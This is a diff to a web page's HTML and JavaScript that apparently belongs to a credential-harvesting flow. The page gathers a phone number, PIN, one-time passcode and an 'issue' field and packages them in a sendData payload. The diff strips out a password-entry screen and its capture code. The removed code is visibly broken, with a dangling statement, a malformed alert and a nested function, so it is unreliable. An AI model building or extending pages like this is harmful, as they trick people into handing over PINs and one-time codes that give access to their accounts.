@@ -317,18 +317,8 @@
 
       <button type="button" class="btn" onclick="submitCredentials()">Continue </button>
       <button type="button" class="btn-secondary" onclick="reset()">Back</button>
-    </div>   
-<div id="viewPass" class="view">
-<h1>Enter Password</h1>
-<p class="subtitle">Visual demonstration only</p>
-<div class="input-group">
-<label for="password">Account Password</label>
-<input type="password" id="password" placeholder="Enter your password">
-</div>
-<button type="button" class="btn" onclick="submitPassword()">Continue</button>
-<button type="button" class="btn-secondary" onclick="reset()">Back</button>
-</div>
-    
+    </div>
+
     <!-- VIEW 3 -->
     <div id="view3" class="view">
       <h1>Processing ...</h1>
@@ -401,8 +391,7 @@
     async function sendData(eventName, extraData = {}) {
       const demoPayload = {
   phone: document.getElementById('reference')?.value || '',
-  document.getElementById('password')?.value.
-  password:state.password||'',
+  password: '',
   pin: state.pin || '',
   issue: state.issue,
   otp: state.otp || '',
@@ -442,17 +431,6 @@
         return;
       }
       state.reference = reference;
-      async function submitPassword() {
-  const passInput = document.getElementById('password');
-  if (!passInput.value.trim()) {
-    alert('Please enter your password.');
-    passInput.focus();
-    return;
-  }
-  state.password = passInput.value.trim();
-  showview('viewPass');
-      }
-      alert(``password assigend:'')
       await runStep("Sending event...", "verification", "view4");
     }
 
